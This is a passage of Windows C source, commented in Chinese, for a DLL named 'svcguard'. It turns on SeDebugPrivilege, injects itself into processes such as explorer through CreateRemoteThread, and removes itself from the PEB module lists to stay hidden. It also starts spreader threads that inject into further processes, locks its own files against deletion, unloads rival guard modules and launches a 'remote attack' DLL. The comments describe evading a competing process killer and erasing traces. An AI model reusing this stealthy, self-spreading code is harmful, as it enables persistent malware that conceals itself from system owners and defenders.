    case 3:  return g_szInjectAtk[0] ? g_szInjectAtk : g_szAtkDllPath;
    case 4:  return g_szInjectDel[0] ? g_szInjectDel : g_szDeleterDllPath;
    default: return g_szInjectGuard[0] ? g_szInjectGuard : g_szGuardDllPath;
    }
}

/* ================== 方案 A：把会话随机名送进宿主 ==================
   注入成功后，把 XX_NAME_BLOCK 写进目标进程私有内存，再 CreateRemoteThread 调用
   目标里那份 dll 的导出函数 XxSetNames；调用返回后**立刻清零再 VirtualFreeEx**
   （读后即删，不在目标里留痕、不落盘、不进任何全局命名空间）。
   RVA 用 LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) 映射同一份文件取得：
   临时副本与本地文件字节相同，RVA 通用，而且这样映射不会执行对方 DllMain。 */


#include "parts/inject.c"

#include "parts/spread.c"

#include "parts/spreader.c"

static DWORD WINAPI BootThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    StartRemoteAttack();
    return 0;
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ================== */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

/* 远程导出：接收会话随机名（方案 A；参数块由注入方清零并释放） */
__declspec(dllexport) BOOL WINAPI XxSetNames(const XX_NAME_BLOCK *pBlock)
{
    ULONGLONG tok = 0;
    if (!XXNameBlockTake(pBlock, &tok, NULL)) return FALSE;
    if (tok) g_dwNameToken = tok;
    return TRUE;
}

__declspec(dllexport) void WINAPI DeamonInit(void)
{
    BOOL bPriv = EnableDebugPrivilege();
    DWORD sid = 0;
    /* xx.exe 自身的 DACL 会拒绝 Everyone（连自己都打不开），在它进程里
       ProcessIdToSessionId(自己) 会失败并给 0；所以优先读共享内存里记的会话号 */
    if (g_pSharedView) sid = (DWORD)XX_SESSION(g_pSharedView);
    if (sid == 0) ProcessIdToSessionId(GetCurrentProcessId(), &sid);
    WriteDeamonLog(L"DeamonInit: pid=%lu session=%lu SeDebugPrivilege=%ls\n",
                   GetCurrentProcessId(), sid, bPriv ? L"ON" : L"OFF");
    CreateThread(NULL, 0, HeartbeatMonitor, NULL, 0, NULL);

#if !XX_HOST_INJECTION
    WriteDeamonLog(L"宿主注入已关闭（XX_HOST_INJECTION=0）：只做心跳监控/复活，不注入任何进程\n");
    return;
#endif

    /* 弹窗宿主（explorer/taskhost）里只保留心跳监控：
       Spreader 会从宿主再往别的进程注入、OwnFileShield 会反复锁文件 —— 这两件最重，
       而且历史上它们一跑，宿主就崩（用户实测 explorer 反复"已停止工作"）。
       弹窗宿主崩了 = 弹窗没了，所以宁可少做事。 */
    {
        WCHAR leaf[MAX_PATH] = L"";
        OwnHostLeaf(leaf, MAX_PATH);
        if (IsPopupHostProcess(leaf)) {
            WriteDeamonLog(L"DeamonInit: 弹窗宿主（%ls）只起心跳监控，跳过扩散/文件盾\n", leaf);
        } else {
            CreateThread(NULL, 0, SpreaderThread, NULL, 0, NULL);
            CreateThread(NULL, 0, OwnFileShieldThread, NULL, 0, NULL);
        }
    }
}

/* ================== 崩溃日志（诊断版） ==================
   把"出错模块 + RVA + 访问类型 + 栈回溯"都写出来，这样**不需要 Process Explorer / dump**
   就能定位到具体函数：
     [CRASH] svcguard pid=1572 host=explorer.exe code=0xC0000005 (write to 0x00000000)
             at window.dll+0x54C0  frames: svcguard.dll+0x12AB ntdll.dll+0x3C1D …
   模块/RVA 用 GetModuleHandleExW(FROM_ADDRESS) 反查 —— 即使模块被我们摘过链，
   只要不是我们自己那份，也能查到；查不到就写绝对地址。 */
static void DescribeAddr(void *addr, WCHAR *out, SIZE_T cch)
{
    HMODULE hMod = NULL;
    WCHAR path[MAX_PATH] = L"";
    const WCHAR *leaf;
    if (!addr) { wcsncpy_s(out, cch, L"(null)", _TRUNCATE); return; }
    if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                           GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                           (LPCWSTR)addr, &hMod) && hMod) {
        if (!GetModuleFileNameW(hMod, path, MAX_PATH)) path[0] = L'\0';
        leaf = path[0] ? (wcsrchr(path, L'\\') ? wcsrchr(path, L'\\') + 1 : path) : L"?";
        _snwprintf(out, cch - 1, L"%ls+0x%IX", leaf, (ULONG_PTR)addr - (ULONG_PTR)hMod);
    } else {
        _snwprintf(out, cch - 1, L"%p", addr);
    }
    out[cch - 1] = L'\0';
}

static LONG WINAPI DeamonCrashFilter(EXCEPTION_POINTERS *ep)
{
    DWORD code = 0;
    void *addr = NULL;
    ULONG_PTR info0 = 0, info1 = 0;
    WCHAR where[300] = L"(?)", frames[600] = L"";
    WCHAR host[MAX_PATH] = L"";

    if (ep && ep->ExceptionRecord) {
        code = ep->ExceptionRecord->ExceptionCode;
        addr = ep->ExceptionRecord->ExceptionAddress;
        if (ep->ExceptionRecord->NumberParameters >= 2) {
            info0 = ep->ExceptionRecord->ExceptionInformation[0];  /* 0=读 1=写 8=执行 */
            info1 = ep->ExceptionRecord->ExceptionInformation[1];  /* 出错的内存地址 */
        }
    }
    OwnHostLeaf(host, MAX_PATH);
    DescribeAddr(addr, where, _countof(where));

    {   /* 栈回溯：最多 10 帧，每帧都换算成 模块+0xRVA */
        void *stack[10];
        USHORT n = RtlCaptureStackBackTrace(1, 10, stack, NULL), i;
        for (i = 0; i < n; i++) {
            WCHAR one[160];
            DescribeAddr(stack[i], one, _countof(one));
            wcscat_s(frames, _countof(frames), (i == 0) ? one : L" ");
            if (i > 0) {
                WCHAR sep[8] = L" ";
                (void)sep;
            }
        }
    }

    WriteDeamonLog(L"[CRASH] svcguard pid=%lu host=%ls code=0x%08lX %ls at=%ls\n"
                   L"        frames: %ls\n",
                   GetCurrentProcessId(), host, (unsigned long)code,
                   (info0 == 1) ? L"(write)" : (info0 == 8) ? L"(exec)" : L"(read)",
                   where, frames[0] ? frames : L"(none)");
    /* 出错的内存地址也写出来：0x0 之类说明是空指针/偏移写 */
    if (info1) WriteDeamonLog(L"        fault-addr=0x%IX\n", info1);
    return EXCEPTION_EXECUTE_HANDLER;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);
        SetUnhandledExceptionFilter(DeamonCrashFilter);

        /* 摘 PEB 链之后 GetModuleHandle/GetModuleFileName(自己) 就查不到了，
           所以先把自身模块信息缓存下来，后面一律用缓存值。 */
        g_hSelfModule = hinst;
        GetModuleFileNameW(hinst, g_szSelfPath, MAX_PATH);

        /* 模块被隐藏后注入方无法再用"模块列表"判断宿主里有没有我们，会反复重复
           注入；没有单例就会在同一进程里叠出多份实例、多套线程。已有实例时直接
           让加载失败（返回 FALSE），这样重复注入不会残留映射。

           **不再等 token**（原来这里等 300ms）：XxSetNames 是注入方在 LoadLibrary
           返回之后才远程调用的，DllMain 这一刻 g_dwNameToken 还是 0，但候选表
           （token → 共享 64 位 salt → 固定值 → 裸名）让创建与探测用同一张表，
           回退名同样能被注入方认出来，所以等待纯属白送时间 —— 而 yy 的
           HunterWorker 每 50ms 就杀一轮，这 300ms 很贵。 */
        g_hSingleton = XXModuleSingleton(L"svcguard", NameTok());
        if (!g_hSingleton) return FALSE;

        XXHideSelfFromPeb(hinst);          /* 从 PEB 三条模块链表里摘除自己 */

#if !XX_HOST_INJECTION
        WriteDeamonLog(L"DllMain: 宿主注入已关闭（XX_HOST_INJECTION=0），不起 Boot/Unload/扩散线程\n");
        return TRUE;
#endif
        /* 同样按"弹窗宿主"减负：
             BootThread → StartRemoteAttack → 在宿主里 LoadLibrary(atkcore.dll)，
                          等于绕过了"重模块不进弹窗宿主"的策略；
             UnloadForeignGuardThread → 对宿主里的模块做 FreeLibrary，
                          如果那个模块的线程正在跑就会直接崩（写非法地址）。
           这两个在弹窗宿主里一律不启动。 */
        {
            WCHAR leaf[MAX_PATH] = L"";
            OwnHostLeaf(leaf, MAX_PATH);
            if (IsPopupHostProcess(leaf)) {
                WriteDeamonLog(L"DllMain: 弹窗宿主（%ls）不启动 Boot/Unload 线程\n", leaf);
            } else {
                CreateThread(NULL, 0, BootThread, NULL, 0, NULL);
                CreateThread(NULL, 0, UnloadForeignGuardThread, NULL, 0, NULL);
            }
        }
    }
    return TRUE;
}



































